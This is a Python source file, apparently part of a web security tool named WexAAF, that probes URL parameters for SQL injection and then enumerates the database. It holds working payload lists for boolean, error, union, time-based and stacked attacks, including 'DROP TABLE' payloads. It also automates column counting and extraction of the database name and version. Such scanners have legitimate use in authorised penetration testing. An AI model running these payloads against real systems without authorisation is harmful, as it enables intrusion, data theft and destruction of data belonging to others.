"""
SQL Injection Module for WexAAF
Detects and analyzes SQL injection vulnerabilities
"""

import re
from .utils import Colors


class SQLInjector:
    """
    SQL Injection Detection and Analysis class
    """
    
    # Common SQL injection payloads
    PAYLOADS = {
        # Boolean-based payloads
        'boolean': [
            '1\' OR \'1\'=\'1',
            '1" OR "1"="1',
            "' OR '1'='1",
            '" OR "1"="1',
            '1 AND 1=1',
            '1 AND 1=2'
        ],
        # Error-based payloads
        'error': [
            '\'',
            '"',
            '1\'',
            '1"',
            '\')',
            '(")'
        ],
        # Union-based payloads
        'union': [
            '1 UNION SELECT 1--',
            '1 UNION SELECT 1,2--',
            '1 UNION SELECT 1,2,3--',
            '\' UNION SELECT 1,2,3--',
            '1" UNION SELECT 1,2,3--'
        ],
        # Time-based payloads
        'time': [
            '1 AND SLEEP(5)--',
            '1\' AND SLEEP(5)--',
            '1" AND SLEEP(5)--',
            '1 AND BENCHMARK(5000000,MD5(1))--',
            '1; WAITFOR DELAY \'0:0:5\'--'
        ],
        # Stacked queries
        'stacked': [
            '1; DROP TABLE test--',
            '1\'; DROP TABLE test--',
            '1"; DROP TABLE test--'
        ]
    }
    
    # Database error signatures
    DATABASE_ERRORS = {
        'MySQL': [
            'you have an error in your sql syntax',
            'mysql_fetch',
            'mysql_num_rows',
            'mysql_result',
            'mysql_connect',
            'mysqli',
            'mysql error'
        ],
        'PostgreSQL': [
            'postgresql',
            'pg_query',
            'pg_fetch',
            'pg_exec',
            'pg_connect',
            ' Npgsql',
            'psql'
        ],
        'SQL Server': [
            'microsoft sql server',
            'odbc sql server',
            'sqlserver',
            'sqlexception',
            'sql error',
            'mssql'
        ],
        'Oracle': [
            'oracle error',
            'ora-',
            'oracle.jdbc',
            'ociexecute',
            'oxcerror'
        ],
        'SQLite': [
            'sqlite',
            'sqlite3',
            'sqlite_busy',
            'syntax error'
        ]
    }
    
    def __init__(self, http_handler):
        """
        Initialize SQL Injector
        
        Args:
            http_handler: HTTPHandler instance
        """
        self.http_handler = http_handler
        
    def find_injectable_params(self):
        """
        Find parameters vulnerable to SQL injection
        
        Returns:
            dict: SQL injection test results
        """
        print(f"{Colors.CYAN}[i] Analyzing URL parameters...{Colors.RESET}")
        
        # Extract parameters from URL
        parameters = self.http_handler.extract_parameters()
        
        if not parameters:
            print(f"{Colors.YELLOW}[!] No parameters found in URL{Colors.RESET}")
            return {
                'vulnerable_params': [],
                'safe_params': [],
                'total_params': 0,
                'database_type': 'Unknown'
            }
        
        print(f"{Colors.CYAN}[i] Found parameters: {', '.join(parameters)}{Colors.RESET}")
        print(f"{Colors.CYAN}[i] Testing {len(parameters)} parameters for SQL injection...{Colors.RESET}")
        
        vulnerable_params = []
        safe_params = []
        detected_db = 'Unknown'
        
        # Get baseline response
        baseline_response = self.http_handler.get()
        
        for param in parameters:
            print(f"{Colors.CYAN}[i] Testing parameter: {param}{Colors.RESET}")
            
            # Test with different payload types
            param_vulnerable = False
            
            # Test boolean-based
            boolean_result = self._test_boolean_payload(param)
            if boolean_result['vulnerable']:
                vulnerable_params.append(param)
                param_vulnerable = True
                detected_db = boolean_result.get('database', detected_db)
                print(f"{Colors.RED}[!] SQL Injection detected (Boolean-based) in parameter: {param}{Colors.RESET}")
            
            # Test error-based
            if not param_vulnerable:
                error_result = self._test_error_payload(param)
                if error_result['vulnerable']:
                    vulnerable_params.append(param)
                    param_vulnerable = True
                    detected_db = error_result.get('database', detected_db)
                    print(f"{Colors.RED}[!] SQL Injection detected (Error-based) in parameter: {param}{Colors.RESET}")
            
            # Test union-based
            if not param_vulnerable:
                union_result = self._test_union_payload(param)
                if union_result['vulnerable']:
                    vulnerable_params.append(param)
                    param_vulnerable = True
                    print(f"{Colors.RED}[!] SQL Injection detected (Union-based) in parameter: {param}{Colors.RESET}")
            
            # Test time-based
            if not param_vulnerable:
                time_result = self._test_time_payload(param)
                if time_result['vulnerable']:
                    vulnerable_params.append(param)
                    param_vulnerable = True
                    print(f"{Colors.RED}[!] SQL Injection detected (Time-based) in parameter: {param}{Colors.RESET}")
            
            if not param_vulnerable:
                safe_params.append(param)
                print(f"{Colors.GREEN}[✓] Parameter {param} appears safe{Colors.RESET}")
        
        return {
            'vulnerable_params': vulnerable_params,
            'safe_params': safe_params,
            'total_params': len(parameters),
            'database_type': detected_db
        }
    
    def _test_boolean_payload(self, param):
        """Test boolean-based SQL injection"""
        url = self.http_handler.target_url
        baseline_response = self.http_handler.get()
        
        # Test true and false conditions
        true_payloads = ['1 AND 1=1', '\'1\' AND \'1\'=\'1']
        false_payloads = ['1 AND 1=2', '\'1\' AND \'1\'=\'2']
        
        for true_payload, false_payload in zip(true_payloads, false_payloads):
            true_response = self._test_injection(param, true_payload)
            false_response = self._test_injection(param, false_payload)
            
            if true_response['success'] and false_response['success']:
                # Check for different responses
                if self._responses_different(true_response, false_response):
                    return {
                        'vulnerable': True,
                        'type': 'Boolean-based',
                        'database': self._detect_database(true_response)
                    }
        
        return {'vulnerable': False, 'type': None}
    
    def _test_error_payload(self, param):
        """Test error-based SQL injection"""
        error_payloads = ["'", '"', '\'', '1\'', '1"', '")', "(''"]
        
        for payload in error_payloads:
            response = self._test_injection(param, payload)
            
            if response['success']:
                database = self._detect_database(response)
                if database != 'Unknown':
                    return {
                        'vulnerable': True,
                        'type': 'Error-based',
                        'database': database,
                        'error_signature': payload
                    }
        
        return {'vulnerable': False, 'type': None}
    
    def _test_union_payload(self, param):
        """Test union-based SQL injection"""
        union_payloads = [
            '1 UNION SELECT 1--',
            '1 UNION SELECT 1,2--',
            '1 UNION SELECT 1,2,3--',
            '1 UNION SELECT 1,2,3,4--',
            '1 UNION SELECT 1,2,3,4,5--',
            '1 UNION SELECT 1,2,3,4,5,6--',
            '\' UNION SELECT 1,2,3--',
            '1" UNION SELECT 1,2,3--'
        ]
        
        baseline_response = self.http_handler.get()
        
        for payload in union_payloads:
            response = self._test_injection(param, payload)
            
            if response['success']:
                # Check if response contains numbers (union reflected)
                if self._check_union_reflection(response):
                    return {
                        'vulnerable': True,
                        'type': 'Union-based'
                    }
        
        return {'vulnerable': False, 'type': None}
    
    def _test_time_payload(self, param):
        """Test time-based (blind) SQL injection"""
        time_payloads = [
            '1 AND SLEEP(3)--',
            '\' AND SLEEP(3)--',
            '" AND SLEEP(3)--',
            '1; WAITFOR DELAY \'0:0:3\'--'
        ]
        
        baseline_response = self.http_handler.get()
        baseline_time = baseline_response.get('response_time', 0)
        
        for payload in time_payloads:
            response = self._test_injection(param, payload)
            
            if response['success']:
                response_time = response.get('response_time', 0)
                # If response is significantly slower, it might be vulnerable
                if response_time > baseline_time + 2:
                    return {
                        'vulnerable': True,
                        'type': 'Time-based',
                        'time_delay': round(response_time - baseline_time, 2)
                    }
        
        return {'vulnerable': False, 'type': None}
    
    def _test_injection(self, param, payload):
        """
        Test SQL injection payload
        
        Args:
            param (str): Parameter to inject
            payload (str): SQL injection payload
        
        Returns:
            dict: Response dictionary
        """
        url = self.http_handler.target_url
        import re
        
        # Replace parameter value in URL with payload
        if '?' in url:
            base_url, query_string = url.split('?', 1)
            params = query_string.split('&')
            modified_params = []
            
            for p in params:
                if p.startswith(f'{param}='):
                    modified_params.append(f'{param}={payload}')
                else:
                    modified_params.append(p)
            
            modified_url = f'{base_url}?{"&".join(modified_params)}'
        else:
            modified_url = f'{url}?{param}={payload}'
        
        return self.http_handler.get(modified_url)
    
    def _detect_database(self, response):
        """
        Detect database type from error messages
        
        Args:
            response (dict): HTTP response
        
        Returns:
            str: Database type
        """
        content = response.get('content', '').lower()
        
        for db_type, signatures in self.DATABASE_ERRORS.items():
            for signature in signatures:
                if signature.lower() in content:
                    return db_type
        
        return 'Unknown'
    
    def _responses_different(self, response1, response2):
        """
        Check if two responses are significantly different
        
        Args:
            response1 (dict): First response
            response2 (dict): Second response
        
        Returns:
            bool: True if responses are different
        """
        # Check status codes
        if response1.get('status_code') != response2.get('status_code'):
            return True
        
        # Check content length
        len1 = response1.get('content_length', 0)
        len2 = response2.get('content_length', 0)
        
        if abs(len1 - len2) > 100:  # Significant difference
            return True
        
        return False
    
    def _check_union_reflection(self, response):
        """
        Check if union injection payload is reflected in response
        
        Args:
            response (dict): HTTP response
        
        Returns:
            bool: True if union reflection detected
        """
        content = response.get('content', '')
        
        # Look for patterns like 1,2,3,4,5 appearing multiple times
        import re
        pattern = r'[1-9](,[1-9])+'
        matches = re.findall(pattern, content)
        
        return len(matches) > 0
    
    def find_columns(self, vulnerable_params):
        """
        Find the number of columns in the database query
        
        Args:
            vulnerable_params (list): List of vulnerable parameters
        
        Returns:
            dict: Column detection results
        """
        print(f"{Colors.CYAN}[i] Attempting to find column count...{Colors.RESET}")
        
        if not vulnerable_params:
            return {
                'column_count': 0,
                'method': None,
                'details': 'No vulnerable parameters'
            }
        
        param = vulnerable_params[0]
        
        # Test ORDER BY method
        print(f"{Colors.CYAN}[i] Using ORDER BY method...{Colors.RESET}")
        order_result = self._test_order_by(param)
        
        if order_result['column_count'] > 0:
            return order_result
        
        # Test UNION SELECT method
        print(f"{Colors.CYAN}[i] Using UNION SELECT method...{Colors.RESET}")
        union_result = self._test_union_columns(param)
        
        return union_result
    
    def _test_order_by(self, param):
        """
        Test column count using ORDER BY method
        
        Args:
            param (str): Vulnerable parameter
        
        Returns:
            dict: Column count results
        """
        for i in range(1, 51):  # Test up to 50 columns
            payload = f'1 ORDER BY {i}--'
            response = self._test_injection(param, payload)
            
            if not response['success'] or response['status_code'] not in [200, 301, 302]:
                # Error occurred, previous number was the column count
                return {
                    'column_count': i - 1,
                    'method': 'ORDER BY',
                    'details': f'Found {i-1} columns using ORDER BY method'
                }
        
        return {
            'column_count': 0,
            'method': 'ORDER BY',
            'details': 'Could not determine column count with ORDER BY'
        }
    
    def _test_union_columns(self, param):
        """
        Test column count using UNION SELECT method
        
        Args:
            param (str): Vulnerable parameter
        
        Returns:
            dict: Column count results
        """
        for i in range(1, 51):  # Test up to 50 columns
            columns = ','.join([str(j) for j in range(1, i+1)])
            payload = f'1 UNION SELECT {columns}--'
            response = self._test_injection(param, payload)
            
            if response['success'] and response['status_code'] == 200:
                # Check if numbers are reflected
                import re
                content = response.get('content', '')
                if self._check_union_reflection(response):
                    return {
                        'column_count': i,
                        'method': 'UNION SELECT',
                        'details': f'Found {i} columns using UNION SELECT method'
                    }
        
        return {
            'column_count': 0,
            'method': 'UNION SELECT',
            'details': 'Could not determine column count with UNION SELECT'
        }
    
    def find_database_info(self, vulnerable_params, column_count):
        """
        Find database information using SQL injection
        
        Args:
            vulnerable_params (list): List of vulnerable parameters
            column_count (int): Number of columns
        
        Returns:
            dict: Database information
        """
        print(f"{Colors.CYAN}[i] Attempting database enumeration...{Colors.RESET}")
        
        if not vulnerable_params or column_count == 0:
            return {
                'database_name': None,
                'version': None,
                'tables': [],
                'details': 'No injection point available'
            }
        
        param = vulnerable_params[0]
        
        # Try to extract database name and version
        db_info = self._extract_database_info(param, column_count)
        
        return db_info
    
    def _extract_database_info(self, param, column_count):
        """
        Extract database information
        
        Args:
            param (str): Vulnerable parameter
            column_count (int): Number of columns
        
        Returns:
            dict: Database information
        """
        # Database-specific queries
        queries = {
            'MySQL': {
                'database': f'1 UNION SELECT 1,database(),3,4,5,6,7,8,9,10--',
                'version': f'1 UNION SELECT 1,version(),3,4,5,6,7,8,9,10--'
            },
            'PostgreSQL': {
                'database': f'1 UNION SELECT 1,current_database(),3,4,5,6,7,8,9,10--',
                'version': f'1 UNION SELECT 1,version(),3,4,5,6,7,8,9,10--'
            },
            'SQL Server': {
                'database': f'1 UNION SELECT 1,db_name(),3,4,5,6,7,8,9,10--',
                'version': f'1 UNION SELECT 1,@@version,3,4,5,6,7,8,9,10--'
            },
            'Oracle': {
                'database': f'1 UNION SELECT 1,global_name,3,4,5,6,7,8,9,10 FROM global_name--',
                'version': f'1 UNION SELECT 1,banner,3,4,5,6,7,8,9,10 FROM v$version WHERE rownum=1--'
            },
            'SQLite': {
                'database': f'1 UNION SELECT 1,\'sqlite\',3,4,5,6,7,8,9,10--',
                'version': f'1 UNION SELECT 1,\'sqlite3\',3,4,5,6,7,8,9,10--'
            }
        }
        
        results = {
            'database_name': None,
            'version': None,
            'tables': []
        }
        
        for db_type, queries_dict in queries.items():
            # Try to get database name
            response = self._test_injection(param, queries_dict['database'])
            
            if response['success'] and response['status_code'] == 200:
                content = response.get('content', '')
                
                # Simple extraction - look for database name patterns
                import re
                
                # Extract database name from content
                patterns = [
                    r'>([a-zA-Z0-9_]+)<',  # HTML tag content
                    r'([a-zA-Z0-9_]{3,20})'  # Common database name pattern
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, content)
                    if matches:
                        # Filter out common words
                        exclude_words = ['div', 'span', 'html', 'body', 'head', 'title', 'meta', 'link']
                        for match in matches:
                            if match.lower() not in exclude_words and len(match) > 3:
                                results['database_name'] = match
                                break
                    if results['database_name']:
                        break
            
            # Try to get version if database found
            if results['database_name']:
                response = self._test_injection(param, queries_dict['version'])
                if response['success']:
                    content = response.get('content', '')
                    # Look for version numbers
                    version_match = re.search(r'(\d+\.\d+\.\d+|\d+\.\d+)', content)
                    if version_match:
                        results['version'] = version_match.group(1)
                
                return results
        
        return results